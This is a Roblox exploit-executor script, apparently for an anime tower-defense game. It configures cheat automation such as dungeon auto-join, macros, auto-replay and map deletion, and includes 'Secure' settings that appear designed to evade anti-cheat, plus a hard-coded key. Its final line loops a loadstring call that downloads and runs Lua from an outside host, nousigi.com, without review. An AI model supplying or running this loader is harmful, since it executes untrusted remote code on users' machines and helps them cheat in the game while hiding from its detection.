game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)
getgenv().RedeemAllCode = true
getgenv().EquipMacroUnit = true
getgenv().Config = {
	["AutoSave"] = true,
	["Dungeon Joiner"] = {
		["Stage"] = "Mountain Shrine (Natural)",
		["Auto Join"] = true,
		["Act"] = "OccultHunt"
	},
	["Joiner Cooldown"] = 10,
	["Macros"] = {
		["Macro"] = "Dung_Base",
		["Ignore Macro Timing"] = true,
		["Play"] = true,
		["No Ignore Sell Timing"] = true
	},
	["Performance"] = {
		["Delete Map"] = true,
		["Boost FPS"] = true,
		["Black Screen"] = true,
		["Delete Entities"] = true
	},
	["Match Finished"] = {
		["Auto Replay"] = true,
		["Replay Amount"] = 0
	},
	["Failsafe"] = {
		["Auto Rejoin"] = true,
		["Teleport Lobby if Player"] = true
	},
	["Secure"] = {
		["Walk Around"] = true,
		["Random Offset"] = true
	},
	["Gameplay"] = {
		["Auto Modifier"] = {
			["Prioritize"] = {
				["Strong"] = 3,
				["Thrice"] = 4,
				["Warding off Evil"] = 23,
				["Range"] = 92,
				["Fast"] = 1,
				["Revitalize"] = 6,
				["Exploding"] = 2,
				["Dodge"] = 10,
				["Immunity"] = 11,
				["Quake"] = 31,
				["Damage"] = 98,
				["Slayer"] = 95,
				["Champions"] = 96,
				["Fisticuffs"] = 9,
				["Drowsy"] = 8,
				["Cooldown"] = 22,
				["Precise Attack"] = 17,
				["Regen"] = 7,
				["King's Burden"] = 99,
				["Common Loot"] = 93,
				["No Trait No Problem"] = 20,
				["Harvest"] = 16,
				["Press It"] = 12,
				["Planning Ahead"] = 24,
				["Shielded"] = 49,
				["Uncommon Loot"] = 94,
				["Money Surge"] = 100
			},
			["Enable"] = true,
			["Amount"] = {
				["Strong"] = 0,
				["Thrice"] = 0,
				["Warding off Evil"] = 0,
				["Range"] = 0,
				["Fast"] = 0,
				["Revitalize"] = 2,
				["Exploding"] = 0,
				["Dodge"] = 0,
				["Immunity"] = 0,
				["Champions"] = 0,
				["Damage"] = 10,
				["Slayer"] = 10,
				["Quake"] = 0,
				["Fisticuffs"] = 0,
				["Drowsy"] = 0,
				["Cooldown"] = 0,
				["Precise Attack"] = 0,
				["Regen"] = 0,
				["King's Burden"] = 0,
				["Common Loot"] = 10,
				["No Trait No Problem"] = 0,
				["Harvest"] = 0,
				["Press It"] = 0,
				["Planning Ahead"] = 0,
				["Shielded"] = 0,
				["Uncommon Loot"] = 10,
				["Money Surge"] = 0
			}
		},
		["Occult Hunt"] = {
			["Collect Talisman"] = true,
			["Use All Talisman"] = {
				["Enable"] = true,
				["Wave"] = 50
			},
			["Use Talisman on Crab"] = true
		},
		["Auto Skip Wave"] = true,
		["Auto Use Ability"] = true
	}
}
getgenv().Key = "k517c79e9160307a9b87210d"
repeat wait(2)spawn(function()loadstring(game:HttpGet("https://nousigi.com/loader.lua"))()end)wait(6)until Joebiden
